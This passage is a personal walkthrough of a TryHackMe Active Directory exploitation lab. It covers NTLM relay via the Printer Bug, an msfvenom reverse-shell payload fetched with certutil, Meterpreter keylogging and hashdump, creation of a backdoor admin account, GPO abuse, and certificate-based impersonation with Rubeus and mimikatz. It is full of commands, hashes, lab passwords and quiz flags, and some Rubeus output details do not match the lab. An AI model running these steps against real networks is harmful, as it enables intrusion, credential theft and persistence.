Which Kerberos Delegation type allows the service to specify who is allowed to delegate to it?
Answer: _Recource-based Constrained Delegation_

Which Constrained Delegation service allows access to the file system of the system via delegation?
Answer: _CIFS_

What is the value of the flag stored in the Desktop directory of the Administrator user on THMSERVER1 (flag2.txt)?
Answer: _THM{Constrained.Delegation.Can.Be.Very.Bad}_


Task4 - Exploiting Automated Relays
------------------------------------------------------------

Similar to the BreachingAD room, we can gather credentials flying across the network, but if we don't want to wait, we can coerce those from the automated systems.

__Machine Accounts__

There is a machine account on every windows host. Unless someone changes the password for it manually, then they are considered to be an uncrackable password. 120 characters (utf-16) and they are rotated automatically every 30 days.

The machine account is what authenticates to AD on your behalf.

Exception is where one AD machine has admin rights over another. This provides us an interesting attack vector.

We need to find those using bloodhound.

__The Printer Bug__

This was originally claimed to be a feature rather than a bug by Microsoft, but after so many exploits they have finally patched it. So in order to exploit it we have to meet these conditions:

1.  A valid set of AD account credentials.
2.  Network connectivity to the target's SMB service.
3.  The target host must be running the Print Spooler service.
4.  The hosts must not have SMB signing enforced.  
    

__Print Spooler Service__

Determine if the service is running:
```shell-session
PS C:\> GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc


Location      :
Name          : Microsoft XPS Document Writer
PrinterState  : 0
PrinterStatus : 3
ShareName     :
SystemName    : THMSERVER2

Location      :
Name          : Microsoft Print to PDF
PrinterState  : 0
PrinterStatus : 3
ShareName     :
SystemName    : THMSERVER2
```

Recently Microsoft has been stopping people from viewing these ports for security reasons. If you get access denied error you can try the following powershell script:

`Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc`

If it still fails, you may just try it anyway as MS is denying it.

__SMB Signing__

If we are hosting an malicious SMB Server we need to make sure SMB Signing is turned off as most networks can use SMB signing as 'allowed', but if it is set as 'enforced' this technique won't work.

We can check with nmap:

```bash
thm@thm:~# nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc 
Nmap scan report for distributor.za.tryhackme.loc (172.31.1.201) 
Host is up (0.62s latency).  

PORT    STATE SERVICE 
445/tcp open  microsoft-ds  

Host script results: 
| smb2-security-mode:  
|   2.02:  
|_    Message signing enabled but not required  

Nmap scan report for 172.31.1.202 
Host is up (0.38s latency).  

PORT    STATE SERVICE 
445/tcp open  microsoft-ds  

Host script results: 
| smb2-security-mode:  
|   2.02:  
|_    Message signing enabled but not required  
Nmap done: 2 IP addresses (2 hosts up) scanned in 4.59 seconds
```

We see that SMB signing is allowed but not enforced so we can attack it.

__Exploiting Authentication Relays__

NOTE: Abusing service like print spooler can cause it to crash. Callbacks can't be guaranteed.

You can get SpoolSample here for this exploit:
https://github.com/leechristensen/SpoolSample

It is written in C# so you will need to compile it.

The idea here is that we use PrintSample to coerce THMSERVER2 to authenticate to us on our Attackbox, then use  [Impacket](https://github.com/SecureAuthCorp/impacket)'s [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) to relay the auth attempt to THMSERVER1.  The recent version uses SMBv2.

Setup NTLM relay:
 `thm@thm:~# python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug`

Remember regarding the IP vs hostname. If we use the hostname instead of IP then it would use Kerberos instead of NTLM. So, use the IP :)

Run the following:

`C:\Tools\>SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"`

You need to use your tunX interface for the network.

## Let's go to town!

Got new credentials.
ssh za.tryhackme.loc\\barbara.reid@thmwrk1.za.tryhackme.loc
Username: barbara.reid Password: Password1

Run this:
```shell-session
PS C:\Users\barbara.reid> GWMI Win32_Printer -Computer thmserver2.za.tryhackme.l
oc
GWMI : Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))  
At line:1 char:1
+ GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-WmiObject], UnauthorizedA  
   ccessException
    + FullyQualifiedErrorId : System.UnauthorizedAccessException,Microsoft.Pow  
   erShell.Commands.GetWmiObjectCommand
 
PS C:\Users\barbara.reid> Get-PrinterPort -ComputerName thmserver2.za.tryhackme.
loc
Get-PrinterPort : Cannot connect to CIM server. Access denied  
At line:1 char:1
+ Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (MSFT_PrinterPort:String) [  
   Get-PrinterPort], CimJobException
    + FullyQualifiedErrorId : CimJob_BrokenCimSession,Get-PrinterPort

```

In both my cases Access was denied. I guess as it says we need to assume its up and take a leap of faith.

Next we do an NMAP scan from the Attackbox:

```bash
# nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc

Starting Nmap 7.60 ( https://nmap.org ) at 2022-11-12 00:11 GMT
Nmap scan report for thmserver1.za.tryhackme.loc (10.200.83.201)
Host is up (0.038s latency).
rDNS record for 10.200.83.201: ip-10-200-83-201.eu-west-1.compute.internal

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required

Nmap done: 2 IP addresses (1 host up) scanned in 3.19 seconds

```

It shows SMB signing is enabled but not required.

On our attackbox we start an NTLM relay:
```bash
# python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://10.200.83.201 -debug
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[+] Impacket Library Installation Path: /root/.local/lib/python3.9/site-packages/impacket
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack SMB loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
Exception in thread Thread-2:
Traceback (most recent call last):
  File "/usr/lib/python3.9/threading.py", line 973, in _bootstrap_inner
    self.run()
  File "/root/.local/lib/python3.9/site-packages/impacket/examples/ntlmrelayx/servers/httprelayserver.py", line 539, in run
    self.server = self.HTTPServer((self.config.interfaceIp, self.config.listeningPort), self.HTTPHandler, self.config)
  File "/root/.local/lib/python3.9/site-packages/impacket/examples/ntlmrelayx/servers/httprelayserver.py", line 45, in __init__
    socketserver.TCPServer.__init__(self,server_address, RequestHandlerClass)
  File "/usr/lib/python3.9/socketserver.py", line 452, in __init__
    self.server_bind()
  File "/usr/lib/python3.9/socketserver.py", line 466, in server_bind
    self.socket.bind(self.server_address)
OSError: [Errno 98] Address already in use
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Now on the windows box THMWRK1:
```shell-session
za\barbara.reid@THMWRK1 c:\Tools>SpoolSample.exe THMSERVER2.za.tryhackme.loc 10.50.81.189
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\THMSERVER2.za.tryhackme.loc, CaptureServer: \\10.50.81.189      
```

Now back on our attackbox we see:
```bash
[*] SMBD-Thread-5: Received connection from 10.200.83.202, attacking target smb://10.200.83.201
[*] Authenticating against smb://10.200.83.201 as ZA/THMSERVER2$ SUCCEED
[+] No more targets
[*] SMBD-Thread-7: Connection from 10.200.83.202 controlled, but there are no more targets left!
[+] No more targets
[*] SMBD-Thread-8: Connection from 10.200.83.202 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[+] Retrieving class info for JD
[+] Retrieving class info for Skew1
[+] Retrieving class info for GBG
[+] Retrieving class info for Data
[*] Target system bootKey: 0x4e05e7ea4fdddde75aa56010474948dc
[+] Saving remote SAM database
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
[+] Calculating HashedBootKey from SAM
[+] NewStyle hashes is: True
ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
[+] NewStyle hashes is: True
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8:::
[+] NewStyle hashes is: True
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae:::
[+] NewStyle hashes is: True
trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
[*] Done dumping SAM hashes for host: 10.200.83.201
[*] Stopping service RemoteRegistry
```



__Questions__

How often (in days) are the passwords of Windows machine accounts rotated by default?
Answer: _30_

What should not be enforced if we want to relay an SMB authentication attempt?
Answer: _SMB signing_

What is the value of the flag stored in the Desktop directory of the Administrator.ZA user on THMSERVER1 (flag3.txt)?
Answer: _THM{Printing.Some.Shellz}_



Task5 - Exploiting AD Users
-------------------------------------------------

In this task we will start targeting AD users.

__Users and User Behavior__

Humans are often the weakest link in the security chain. Be it through social engineering or through their bad habbits, this can be an effective avenue to abuse to gain or elevate access.

Here we focus on:

-   Credential Management - How users store their credentials. In AD, this is quite important since users may have multiple sets of credentials and remembering all of them can be a hassle.
-   Keylogging - Often, during exploitation, we need to understand how normal users interact with a system. Together with screengrabs, Keylogging can be a useful tool to gain this understanding from an attacker's perspective.

__Hunting for Credentials__

There could be credentials any many places. Noteably in config files for services etc. In this case we should find a .kdbx file on THMSERVER1.

We could try to crack it to get access to their password db, but it could be easier watching how the user interacts with it.

__SYSTEM is Sometimes Too Privileged__

Meterpreter has a keylogger. We can't user that to log the users keystrokes without first migrating it to a process in context of the user.

Using our remote code execution on THMSERVER1, we will use this to get a Meterpreter shell.

```bash
# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.50.81.189 LPORT=443 -f psh -o hax0r.ps1
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 201283 bytes
Final size of psh file: 939213 bytes
Saved as: hax0r.ps1

```

Then we can setup a listener:

```bash
msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp 
payload => windows/x64/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.50.81.189
LHOST => 10.50.81.189
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > run


```

Host your exploit shell.ps1 using python
```bash
python -m http.server 8080
```

Now you can pull your exploit over with:
```shell-session
[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents> certutil.e
xe -urlcache -split -f http://10.50.81.189:8080/hax0r.ps1
****  Online  **** 
  000000  ...
  0e54cd
CertUtil: -URLCache command completed successfully.


```

Now we catch it in Meterpreter:
```shell-session
*] Started reverse TCP handler on 10.50.81.189:443 
[*] Meterpreter session 1 opened (10.50.81.189:443 -> 10.200.83.201:61906) at 2022-11-12 09:43:05 +0000

meterpreter > 

```

Let's download that Keepass database 1st.
```shell-session
meterpreter > cd Documents
meterpreter > dir
Listing: C:\Users\t1_trevor.jones\Documents
===========================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2022-04-29 12:11:28 +0100  My Music
40777/rwxrwxrwx   0       dir   2022-04-29 12:11:28 +0100  My Pictures
40777/rwxrwxrwx   0       dir   2022-04-29 12:11:28 +0100  My Videos
100666/rw-rw-rw-  1886    fil   2022-04-30 15:26:49 +0100  PasswordDatabase.kdbx
100666/rw-rw-rw-  402     fil   2022-04-30 15:30:41 +0100  desktop.ini
100666/rw-rw-rw-  939213  fil   2022-11-12 09:38:45 +0000  hax0r.ps1
100666/rw-rw-rw-  3240    fil   2022-06-14 14:12:29 +0100  metrepreter-64.ps1

meterpreter > download PasswordDatabase.kdbx
[*] Downloading: PasswordDatabase.kdbx -> PasswordDatabase.kdbx
[*] Downloaded 1.84 KiB of 1.84 KiB (100.0%): PasswordDatabase.kdbx -> PasswordDatabase.kdbx
[*] download   : PasswordDatabase.kdbx -> PasswordDatabase.kdbx
meterpreter > 
```


Now check if the user's process is running:

```meterpreter-shell
meterpreter\>ps | grep "explorer" 
Filtering on 'explorer' 

Process List 
============ 

PID PPID Name Arch Session User Path 
--- ---- ---- ---- ------- ---- ---- 
3612 3592 explorer.exe x64 1 THMSERVER1\trevor.local C:\Windows\explorer.exe
```

We found explorer running in the user's context. Let's migrate to it:
```meterpreter-shell
meterpreter\>migrate 3612 
[*] Migrating from 4408 to 3612... 
[*] Migration completed successfully.
```

Now we can confirm:
```meterpreter-shell
meterpreter\>getuid Server username: THMSERVER1\trevor.local
```

Now we start our keylogger:
```meterpreter-shell
meterpreter\>keyscan_start Starting the keystroke sniffer ...
```

Now we just have to be patient and wait. If we get lucky we can capture some credentials. Wait a few mins and dump the captured keystrokes.

```meterpreter-shell
meterpreter\>keyscan_dump Dumping captured keystrokes... keep<CR> <Shift>Passwordpasswordpassword<CR>
```

For this example we will need Keepass since that is the format of the file we captured earlier.

To install Keypass you can use `sudo apt install keepassx`
Although I used kpcli here:
```shell-session
sudo apt install -y kpcli
kpcli

# Password is: Imreallysurenoonewillguessmypassword
kpcli:/> open PasswordDatabase.kdbx
kpcli:/> ls
kpcli:/> ls PasswordDatabase/*
kpcli:/> show -f -a PasswordDatabase/General/Flag

THM{AD.Users.Can.Give.Up.Good.Secrets}

kpcli:/> show -f -a PasswordDatabase/General/svcServMan

Sup3rStr0ngPass!@
```

Now would be a good time to make a local account on THMSERVER1 and grant it admin rights to keep a foothold. This isn't really needed for the rest of the tasks tho.

```shell-session
meterpreter > use priv
[-] The 'priv' extension has already been loaded.

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > hashdump
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8:::
meterpreter > 

```

Create a foothold for later:
```shell-session
meterpreter> migrate 1976
shell

C:\Windows\system32>net user /add hax0r p@55w0rd!
net user /add hax0r p@55w0rd!
The command completed successfully.


C:\Windows\system32>net localgroup administrators hax0r /add
net localgroup administrators hax0r /add
The command completed successfully.
```

__Questions__

What application is used to open the kdbx credential database?
Answer: _keepass_

What meterpreter command do we use to move from SYSTEM to user context?
Answer: _migrate_

What is the password of the credential database?
Answer: _Imreallysurenoonewillguessmypassword_

What is the value of the flag stored in the credential database?
Answer: _THM{AD.Users.Can.Give.Up.Good.Secrets}_


Task6 - Exploiting GPOs
-----------------------------------------

We found the credentials for the svcServMan account. We can use Bloodhound to search for that account and see what it has access to.

We see it has ownership of a Group Policy Object (GPO) which is applied to THMSERVER2.

SVCSERVMAN -- GenericWrite --> MANAGEMENT SERVER PUSHES -- GpLink --> MANAGEMENT SERVERS -- Contains --> THMSERVER2

__Group Policy Objects__

AD GPOs are stored in the SYSVOL directory where they wait to be replicated to AD joined machines. The GPO is basically a virtual collection of policy settings. They each have unique names called a GUID

Each Windows computer has a Local Policy Configuration. It contains configuration options such as:

-   Application configuration for services such as the Firewall, Anti-Virus, and Applocker.  
-   Local Group membership such as the Administrator or Remote Desktop Users groups.
-   Startup configuration such as scripts that should be executed.
-   Security and protocol settings such as SMBv1 support.

__Group Policy Management__

GPM allows us to define policies directly on AD structure. We define GPOs for AD objects such as OU or group.

Domain-joined computers then pull all policies from SYSVOL and apply ones that are applicable. By default these policies are replicated every 15 mins by the gpupdate application. This tool can be run manually to update policies instantly.

__Exploiting GPOs__

There are many ways to exploit a GPO, but in this case we will add an AD account we control to the loal Admins and local Remote Dekstop Users groups. This should give us admin rights on THMSERVER2 and a way to RDP in. We could use SSH, but remember lots of orgs still haven't setup/enabled SSH on their Windows devices. RDP is the conventional way to do this.

This time we we be stealthy and RDP into THMWRK1 as normal or t2_admin account, inject the AD user's creds into memory using the runas command, open MMC and modify the GPO.

We will need to run the following in an Admin enabled CMD window:
```shell-session
C:\>runas /netonly /user:za.tryhackme.loc\<AD Username> cmd.exe
```

To verify we provided the right credentials, we can run:
`dir \\za.tryhackme.loc\sysvol`

In the newly spawned cmd prompt we can start Microsoft Management Console:
```shell-session
C:\>mmc
```

Now add the Group Policy Management snap-in:
1.  Click**File**->**Add/Remove Snap-in**
2.  Select the**Group Policy Management**snap-in and click**Add**
3.  Click**Ok**

After that you should be able to see the GPOs for za.tryhackme.loc domain.

Now navigate to the GPO that our user has permissions to modify under Servers->Management Servers->Management Server Pushes

Right click the GPO and select Edit. This will open the new Group Policy Management Editor Window.

Now add our account to the local groups:
1.  Expand**Computer Configuration**
2.  Expand**Policies**
3.  Expand**Windows Settings**
4.  Expand**Security Settings**
5.  Right Click on**Restricted Groups**and select**Add Group**(If the**IT Support**group already exists, it means someone has already performed the exploit. You can either delete it to create it yourself, or just inspect it to see what was configured.)  
6.  Click**Browse,**enter**IT Support**and click**Check Names**
7.  Click**Okay**twice

In the second box/filter we want to add Adminstrators and Remote Desktop Users

Now click Apply and OK. Now we just wait up to 15 mins for the GPO to get pushed.


__Questions__

What object allows users to configure Windows policies?
Answer: _Group Policy Objects_

What AD feature allows us to configure GPOs for the entire AD structure?
Answer: _Group Policy Management_

What is the name of the GPO that our compromised AD account owns?
Answer: _Management Server Pushes_

What is the value of the flag stored on THMSERVER2 in the Administrator's Desktop directory (flag4.txt)?
Answer: _THM{Exploiting.GPOs.For.Fun.And.Profit}_


Task7 - Exploiting Certificates
----------------------------------------------------

We have access to Tier 1 but now we don't have an easy way to move to the next tier. In this section we will look at other more creative ways like exploiting Certificates.

__AD Certificate Services__

AD is too privileged to run on all machines. It is usually only hosted on selected domain controllers. So users cannot really interact with it directly. Since companies are quite large it is difficult for a few admins to manage all the certs. Instead they have templates which the users can use to request a certificate by themselves. 

The templates have rules that decide who can request certs and what the requirements are. There can be certain combinations of these that provide for easy privEsc.

Here is some terminology:
-   PKI - Public Key Infrastructure is a system that manages certificates and public key encryption  
    
-   AD CS - Active Directory Certificate Services is Microsoft's PKI implementation which usually runs on domain controllers
-   CA - Certificate Authority is a PKI that issues certificates  
-   Certificate Template - a collection of settings and policies that defines how and when a certificate may be issued by a CA
-   CSR - Certificate Signing Request is a message sent to a CA to request a signed certificate
-   EKU - Extended/Enhanced Key Usage are object identifiers that define how a generated certificate may be used

__Finding Vulnerable Certificate Templates__

We can use Powershell and certutil to find them:
`C:\>certutil -Template -v > templates.txt`

We could also use a certificate auditing tool such as Ghostpack's [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit).

We are looking for a template with the following parameters:

-   **Client Authentication** - The certificate can be used for Client Authentication.
-   **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** - The certificate template allows us to specify the Subject Alternative Name (SAN).
-   **CTPRIVATEKEY_FLAG_EXPORTABLE_KEY** - The certificate will be exportable with the private key.
-   **Certificate Permissions** - We have the required permissions to use the certificate template.

In this room Template[32] is vulnerable. We can see the machine account of THMSERVER2 can issue a CSR for a template that allows us to specify the Subject Alternative Name (SAN) and can be used for client auth.

__Exploiting a Certificate Template__

Now on THMSERVER2 we will use MMC
1.  Click **Start**->**run**
2.  Type **mmc** and hit enter
3.  Click **File**->**Add/Remove Snap-in..**
4.  Add the **Certificates** snap-in and make sure to select **Computer Account** and **Local computer** on the prompts.
5.  Click **OK**

We will request a personal certificate:

1.  Right Click on **Personal** and select **All Tasks**->**Request New Certificate...**
2.  Click **Next** twice to select the AD enrollment policy.
3.  You will see that we have one template that we can request, but first, we need to provide additional information.
4.  Click on the **More Information** warning.
5.  Change the **Subject name Type** option to **Common Name** and provide any value, since it does not matter, and click **Add**.
6.  Change the **Alternative name Type** option to **User principal name**.
7.  Supply the UPN of the user you want to impersonate. The best would be a DA account such as Administrator@za.tryhackme.loc and click **Add.**

Once you are happy with it, click **Apply** and **OK**. Then, select the certificate and click **Enroll**. You should be able to see your certificate:

The last step is to export our certificate with the private key:

1.  Right-click on the certificate and select **All Tasks**->**Export...**
2.  Click **Next**, select **Yes, export the private key**, and click **Next**.
3.  Click **Next**, then set a password for the certificate since the private key cannot be exported without a password.
4.  Click **Next** and select a location to store the certificate.
5.  Click **Next** and finally click **Finish.**

__User Impersonation through a Certificate__

Now that we can impersonate a user, we need the following required steps:
-   Use the certificate to request a Kerberos ticket-granting ticket (TGT)  
    
-   Load the Kerberos TGT into your hacking platform of choice

Now we will be using [Rubeus](https://github.com/GhostPack/Rubeus). 

```shell-session
C:\THMTools> .\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:12.31.1.101
          ______        _
         (_____ \      | |
          _____) )_   _| |__  _____ _   _  ___
         |  __  /| | | |  _ \| ___ | | | |/___)
         | |  \ \| |_| | |_) ) ____| |_| |___ |
         |_|   |_|____/|____/|_____)____/(___/
       
         v2.0.0
       
       [*] Action: Ask TGT
       
       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert
       [*] Building AS-REQ (w/ PKINIT preauth) for: 'lunar.eruca.com\svc.gitlab'
       [+] TGT request successful!
       [*] base64(ticket.kirbi):
       
             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
       
         ServiceName              :  krbtgt/za.tryhackme.loc
         ServiceRealm             : ZA.TRYHACKME.LOC
         UserName                 : Adminsitrator
         UserRealm                : ZA.TRYHACKME.LOC
         StartTime                :  2/6/2022 5:54:46 PM
         EndTime                  :  2/7/2022 3:54:46 AM
         RenewTill                :  2/13/2022 5:54:46 PM
         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
         KeyType                  :  aes256_cts_hmac_sha1
         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=
         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED
```

Now user mimikatz:

```shell-session
C:\Tools>mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt administrator.kirbi

* File: 'administrator.kirbi': OK

misc:cmd

```

This will pop open an explorer window on the target! Then we just browser to C:\Users\Administrator\Desktop to find flag5

```


C:\Tools>dir \\THMDC.za.tryhackme.loc\c$\
 Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\THMDC.za.tryhackme.loc\c$

01/04/2022  08:47 AM               103 delete-vagrant-user.ps1
04/30/2022  10:24 AM               154 dns_entries.csv
04/27/2022  10:53 PM           885,468 MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin
09/15/2018  08:19 AM    <DIR>          PerfLogs
03/21/2020  09:31 PM    <DIR>          Program Files
03/21/2020  09:28 PM    <DIR>          Program Files (x86)
04/27/2022  08:27 AM             1,423 thm-network-setup-dc.ps1
04/25/2022  07:13 PM    <DIR>          tmp
04/27/2022  08:22 AM    <DIR>          Users
04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
04/27/2022  08:12 PM    <DIR>          Windows
               7 File(s)      2,356,811 bytes
               7 Dir(s)  50,914,541,568 bytes free
```

What does the user create to ask the CA for a certificate?
Answer: _Certificate Signing Request_

What is the name of Microsoft's PKI implementation?
Answer: _Active Directory Certificate Services_

What is the value of the flag stored on THMDC in the Administrator's Desktop directory (flag5.txt)?
Answer: _THM{AD.Certs.Can.Get.You.DA}_


Task8 - Exploiting Domain Trusts
---------------------------------------------------------

Now that we own tryhackme.loc what about other domains for other regions? If we take control of the root domain TRYHACKME.loc we can be in a good position to compromise all of them.

__Domain Trusts__

Forrests are a collection of one or more domain trees. Domain Trusts are a way for users in the network to get acces to other resources in the domain. They describe how domains of the forrest can communiate. Trusts can be extended to external domains.

2 main types of trust:
-   Directional - The direction of the trust flows from a trusting domain to a trusted domain
